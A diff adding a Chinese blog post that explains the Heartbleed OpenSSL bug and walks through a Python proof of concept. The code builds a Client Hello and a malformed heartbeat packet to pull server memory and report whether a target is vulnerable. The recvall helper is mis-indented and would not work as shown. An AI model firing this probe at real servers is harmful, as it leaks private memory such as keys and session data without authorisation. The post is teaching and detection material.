@@ -1,0 +1,406 @@
+---
+title: HTTPS HeartBleed漏洞实践
+description: >
+  HeartBleed Introduce
+layout: post
+categories: 运维
+---
+
+#Heartbleed漏洞实践
+
+2014年4月7日OpenSSL发布了安全公告，在OpenSSL1.0.1版本中存在严重漏洞(CVE-2014-0160)。OpenSSL Heartbleed模块存在一个BUG，问题存在于ssl/dl_both.c文件中的心跳部分，当攻击者构造一个特殊的数据包，伪造成用户心跳包，满足用户心跳包中无法提供足够多的数据会导致memcpy函数把SSLv3记录之后的数据直接输出，该漏洞导致攻击者可以远程读取存在漏洞版本的OpenSSL服务器内存中多达64K的数据。
+
+##1.漏洞说明
+
+```
+
+    OpenSSL Security Advisory [07 Apr 2014]
+    ========================================
+
+    TLS heartbeat read overrun (CVE-2014-0160)
+    ==========================================
+
+A missing bounds check in the handling of the TLS heartbeat extension can be used to reveal up to 64k of memory to a connected client or server.
+
+Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including 1.0.1f and 1.0.2-beta1.
+
+Thanks for Neel Mehta of Google Security for discovering this bug and to Adam Langley <agl@chromium.org> and Bodo Moeller <bmoeller@acm.org> for preparing the fix.
+
+Affected users should upgrade to OpenSSL 1.0.1g. Users unable to immediately upgrade can alternatively recompile OpenSSL with -DOPENSSL_NO_HEARTBEATS.
+
+1.0.2 will be fixed in 1.0.2-beta2.
+
+```
+
+参考：
+
+        http://heartbleed.com/
+        
+##2.TLS/SSL 简介
+
+TLS 和 SSL 是两个密切相关的协议, 均用于保证两个主机之间通信数据的机密性与完整性。
+TLS或 SSL 可为已存在的应用层协议(例如. HTTP, LDAP, FTP, SMTP 及其他)，添加一个安全层。它同样可以用于创建VPN解决方案(例如, OpenVPN).
+SSL 协议于1994年由Netscape开发。1996年，SSL 3.0 (最后版本)被发布。IETF 基于此协议进行了开发，取名为TLS。1999年，IETF在RFC2246中发布TLS 1.0。
+TLS 或 SSL 协议，由多层构成. 最接近它的上层协议是可信传输协议(例如: TCP). 它可用于封装较高层次的协议。
+协议握手 – 允许服务器与客户间相互验证, 协商加密算法,交换密钥.
+协议警告 – 警告讯息传达警告的严重程度和警报的描述(错误，关闭，握手障碍等). 导致连接立即终止的一些致命结果，都会产生警告。警告信息会在当前连接状态下，被加密和压缩。
+协议应用 – 位于传输层协议(TCP/IP)之上, 例如: HTTP, TELNET, FTP, SMTP.
+为了在客户端与服务端建立一个安全会话，TLS/SSL需要完成几步验证，并创建密钥。握手过程，交互信息如下:
+
+![结构](https://raw.githubusercontent.com/chyun/Blog/gh-pages/images/20140611_TLS.jpg)
+
+##3.攻击流程
+
+漏洞的攻击思路:
+
+1. 建立socket连接
+2. 发送TLS/SSL Client Hello请求
+3. 发送畸形heartbleed数据
+4. 检测漏洞存在
+
+###建立socket连接
+
+```
+
+    def ssltest(target, port):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+
+```
+
+其中target为目标IP地址，port为目标端口，默认情况下，HTTPS使用443端口。
+
+###发送握手请求
+
+tcp socket 建立后, 发送SSL/TLS Client Hello请求,
+
+```
+s.send(h2bin(hello))
+
+```
+
+Client Hello请求内容如下所示:
+
+```
+
+    -------------------------[Client Hello]--------------------------
+    Secure Sockets Layer
+    TLSv1.1 Record Layer: Handshake Protocol: Client Hello
+        Content Type: Handshake (22)
+        Version: TLS 1.1 (0x0302)
+        Length: 220
+        Handshake Protocol: Client Hello
+            Handshake Type: Client Hello (1)
+            Length: 216
+            Version: TLS 1.1 (0x0302)
+            Random
+            Session ID Length: 0
+            Cipher Suites Length: 102
+            Cipher Suites (51 suites)
+                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)
+                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)
+                Cipher Suite: TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA (0xc022)
+                Cipher Suite: TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA (0xc021)
+                Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA (0x0039)
+                Cipher Suite: TLS_DHE_DSS_WITH_AES_256_CBC_SHA (0x0038)
+                Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA (0x0088)
+                Cipher Suite: TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA (0x0087)
+                Cipher Suite: TLS_ECDH_RSA_WITH_AES_256_CBC_SHA (0xc00f)
+                Cipher Suite: TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA (0xc005)
+                Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)
+                Cipher Suite: TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (0x0084)
+                Cipher Suite: TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (0xc012)
+                Cipher Suite: TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (0xc008)
+                Cipher Suite: TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA (0xc01c)
+                Cipher Suite: TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA (0xc01b)
+                Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (0x0016)
+                Cipher Suite: TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA (0x0013)
+                Cipher Suite: TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA (0xc00d)
+                Cipher Suite: TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA (0xc003)
+                Cipher Suite: TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)
+                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)
+                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (0xc009)
+                Cipher Suite: TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA (0xc01f)
+                Cipher Suite: TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA (0xc01e)
+                Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA (0x0033)
+                Cipher Suite: TLS_DHE_DSS_WITH_AES_128_CBC_SHA (0x0032)
+                Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA (0x009a)
+                Cipher Suite: TLS_DHE_DSS_WITH_SEED_CBC_SHA (0x0099)
+                Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA (0x0045)
+                Cipher Suite: TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA (0x0044)
+                Cipher Suite: TLS_ECDH_RSA_WITH_AES_128_CBC_SHA (0xc00e)
+                Cipher Suite: TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA (0xc004)
+                Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
+                Cipher Suite: TLS_RSA_WITH_SEED_CBC_SHA (0x0096)
+                Cipher Suite: TLS_RSA_WITH_CAMELLIA_128_CBC_SHA (0x0041)
+                Cipher Suite: TLS_ECDHE_RSA_WITH_RC4_128_SHA (0xc011)
+                Cipher Suite: TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (0xc007)
+                Cipher Suite: TLS_ECDH_RSA_WITH_RC4_128_SHA (0xc00c)
+                Cipher Suite: TLS_ECDH_ECDSA_WITH_RC4_128_SHA (0xc002)
+                Cipher Suite: TLS_RSA_WITH_RC4_128_SHA (0x0005)
+                Cipher Suite: TLS_RSA_WITH_RC4_128_MD5 (0x0004)
+                Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA (0x0015)
+                Cipher Suite: TLS_DHE_DSS_WITH_DES_CBC_SHA (0x0012)
+                Cipher Suite: TLS_RSA_WITH_DES_CBC_SHA (0x0009)
+                Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA (0x0014)
+                Cipher Suite: TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA (0x0011)
+                Cipher Suite: TLS_RSA_EXPORT_WITH_DES40_CBC_SHA (0x0008)
+                Cipher Suite: TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 (0x0006)
+                Cipher Suite: TLS_RSA_EXPORT_WITH_RC4_40_MD5 (0x0003)
+                Cipher Suite: TLS_EMPTY_RENEGOTIATION_INFO_SCSV (0x00ff)
+            Compression Methods Length: 1
+            Compression Methods (1 method)
+            Extensions Length: 73
+            Extension: ec_point_formats
+            Extension: elliptic_curves
+            Extension: SessionTicket TLS
+            Extension: Heartbeat
+
+```
+
+hello的具体16进制数据如下：
+
+```
+
+    hello = [
+            # TLSv1.1 Record Layer : Handshake Protocol: Client Hello
+	"16"        #  Content Type: Handshake (22)
+	"03 02"     #  Version: TLS 1.1 (0x0302)
+	"00 dc"     #  Length: 220
+	            # Handshake Protocol: Client Hello
+	"01"        #  Handshake Type: Client Hello (1)
+	"00 00 d8"  #  Length (216)
+	"03 02"     #  Version: TLS 1.1 (0x0302)
+            #  Random
+	"53 43 5b 90"  # gmt_unix_time
+	"9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de" # random_bytes
+	"00"        # Session ID Length: 0
+	"00 66"     # Cipher Suite Length: 102
+            # Cipher Suites
+	"c0 14" 
+	"c0 0a" 
+	"c0 22"  
+	"c0 21" 
+	"00 39" 
+	"00 38" 
+	"00 88"
+	"00 87"
+	"c0 0f" 
+	"c0 05" 
+	"00 35"  
+	"00 84"
+	"c0 12"
+	"c0 08" 
+	"c0 1c"
+	"c0 1b" 
+	"00 16"
+	"00 13" 
+	"c0 0d"  
+	"c0 03"
+	"00 0a"
+	"c0 13"
+	"c0 09"
+	"c0 1f" 
+	"c0 1e" 
+	"00 33"
+	"00 32"
+	"00 9a"
+	"00 99"
+	"00 45"
+	"00 44"
+	"c0 0e"
+	"c0 04"
+	"00 2f"
+	"00 96"
+	"00 41"
+	"c0 11"
+	"c0 07"
+	"c0 0c"
+	"c0 02" 
+	"00 05"
+	"00 04"
+	"00 15"
+	"00 12"
+	"00 09"
+	"00 14"
+	"00 11"
+	"00 08"
+	"00 06"
+	"00 03"
+	"00 ff"
+	"01"        # Compression Methods
+          	   # Compression Methods (1 method)
+	"00"        # Compression Method: null
+	"00 49"     # Extension Length: 73
+	"00 0b"     # Type: ec_point_formats
+	"00 04"     # Length: 4 
+	"03"        # EC point formats length: 3
+            	   # Elliptic curves point formats
+	"00"        # EC point format: uncompressed (0)
+	"01"        # EC point format: ansix962_compressed_prime
+	"02"        # EC point format: ansix962_compressed_char2
+            	   # Extension: elliptic_curves
+	"00 0a"
+	"00 34"
+	"00 32" 
+	"00 0e"
+	"00 0d"
+	"00 19"
+	"00 0b" 
+	"00 0c"
+	"00 18" 
+	"00 09"  
+	"00 0a" 
+	"00 16" 
+	"00 17" 
+	"00 08"
+	"00 06" 
+	"00 07" 
+	"00 14"
+	"00 15"  
+	"00 04" 
+	"00 05" 
+	"00 12" 
+	"00 13"
+	"00 01" 
+	"00 02" 
+	"00 03" 
+	"00 0f"  
+	"00 10" 
+	"00 11" 
+	"00 23 00 00"     # Extension: SeesionTicket TLS
+	"00 0f 00 01 01"  # Extension: Heartbeat                            
+    ]
+
+```
+
+###解析服务器响应
+
+发送Client Hello后，等待服务端响应, 检测TLS/SSLClient Hello会话是否成功.
+
+```
+
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ == None:
+            return
+        # Look for server hello done message.
+        # typ == 22 ----> Handshake
+        # pay[0] = 0x0E when server Hello message is over
+        if typ == 22 and ord(pay[0]) == 0x0E:
+            break
+
+```
+
+此处服务器返回两次数据. Frame 10返回, 主要用于进一步获取 Server Hello 信息. Frame 11 为 TLS/SSL 的Server Hello 响应. 
+
+```        
+
+    def recvmsg(s):
+        hdr = recvall(s, 5)  # recvall(s, 5, timeout=5) 
+        #  用于进一步确认 Server Hello的信息.
+    
+        if hdr is None:
+            return None, None, None
+        #  > : [big-edition], B : [unsigned char], H: [unsigned short]
+        #  5 bytes which is exactly same with recvall(s, 5)
+        typ, ver, ln = struct.unpack('>BHH', hdr) 
+
+        # 返回 Server Hello 数据内容
+        pay = recvall(s, ln, 10)
+        if pay is None:
+            return None, None, None
+ 
+        return typ, ver, pay
+
+    def recvall(s, length, timeout=5):
+        endtime = time.time() + timeout
+        rdata = ''
+        remain = length
+        while remain > 0:
+            rtime = endtime - time.time() 
+            if rtime < 0:
+                return None
+            r, w, e = select.select([s], [], [], 5)
+            print 'read: ', r
+            if s in r:
+                data = s.recv(remain)
+            
+        # EOF?
+        if not data:
+            return None
+        rdata += data
+        remain -= len(data)
+        hexdump(rdata)
+        return rdata
+
+
+```
+
+Server Hello 消息返回, 说明TTL/SSL 会话成功建立, 此过程伴随有Certificate, Server Key Exchange, Server Hello Done.
+
+###发送畸形heartbleed数据
+
+Server Hello成功返回后, 向服务器发送畸形heartbleed请求. 如果服务器响应, 会伴随有Encrypted Heartbeats Message，也就是泄露的内存数据.
+
+```
+
+s.send(h2bin(hb))  # Malformed Packet
+
+```
+
+Heartbleed 包数据如下:
+
+```
+
+    ---------TLSv1---[Heartbeat Request]------------
+    # It's a fake heartbeat package, the length is not as long as it's claimed
+    hb = [
+          # TLSv1.1 Record Layer: Heartbeat Request
+    "18"      # Content Type: Heartbeat (24) ---- (0x18)
+    "03 02"   # Version: TLS 1.1 (0x0302)
+    "00 03"   # Heartbeat Message: 
+    "01"      #    Type: Request (1) (0x01)
+    "40 00"   #    Payload Length: (16384) (0x4000),服务器会复制内存中16384字节的数据，并发挥给客户端
+    ]
+
+```
+
+检测漏洞是否存在
+
+畸形数据包发送完成后, 检测漏洞是否存在
+
+```
+
+while True:
+        print "[+] receive data..."
+        typ, ver, pay = recvmsg(s)
+        if typ is None:
+            print "[-] %s |NOT VULNERABLE" % target
+            return False
+
+        # TLSv1.1 Record Layer: Encrypted Heartbeat
+        # Content Type: Heartbeat (24)
+        # Version: TLS 1.1 (0x0302)
+        # Length: 19
+        # Encrypted Heartbeat Message
+        if typ == 24:        # Content Type: Heartbeat (24)
+            if len(pay) > 3: # 无数据返回.
+                print "[*] %s |VULNERABLE" % target
+            else:
+                print "[-] %s |NOT VULNERABLE" % target
+            return True
+
+        if typ == 21:
+            print "[-] %s |NOT VULNERABLE" % target
+            return False
+
+```
+
+修复建议:
+        请使用无漏洞版本1.0.1g
+        
+完整代码请参考：
+https://gist.github.com/sh1n0b1/10100394
+
+[id]: https://github.com/chyun/Blog/blob/gh-pages/images/20140611_TLS.jpg
